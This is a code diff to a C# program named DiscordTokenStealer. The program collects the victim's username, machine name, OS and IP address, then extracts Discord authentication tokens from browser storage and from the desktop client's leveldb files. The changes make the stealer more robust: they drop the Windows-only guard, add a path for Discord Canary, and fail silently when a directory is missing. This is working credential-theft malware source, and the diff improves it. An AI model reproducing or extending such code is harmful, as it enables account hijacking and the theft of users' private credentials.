@@ -13,17 +13,13 @@ namespace DiscordTokenStealer
     {
         private static async Task Main(string[] args)
         {
-            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-            {
-                return;
-            }
             StringBuilder content = new StringBuilder($"Username: {Environment.UserName}{Environment.NewLine}").AppendLine($"Machine Name: {Environment.MachineName}").AppendLine($"Operating System: {Environment.OSVersion.Platform}");
             IPAddress? ipAddress = await GetIPAddress();
             if (ipAddress != null)
             {
                 content.AppendLine($"IPAddress: {ipAddress}");
             }
-            string? browserToken = GetBrowserDiscordToken();
+            string? browserToken = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? GetBrowserDiscordToken() : null;
             string? desktopToken = GetDesktopClientToken();
             if (browserToken != null || desktopToken != null)
             {
@@ -66,7 +62,8 @@ namespace DiscordTokenStealer
 
         private static string? GetDesktopClientToken()
         {
-            return ParseToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+            return ParseToken(path) ?? ParseToken(path.Replace("discord", "discordcanary"));
         }
 
         private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
@@ -74,7 +71,7 @@ namespace DiscordTokenStealer
         {
             if (!Directory.Exists(directory))
             {
-                throw new DirectoryNotFoundException("Provied directory doesn't exist.");
+                return null;
             }
             GroupCollection? groups = Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups).FirstOrDefault();
             if (groups == null || groups.Count < 3)
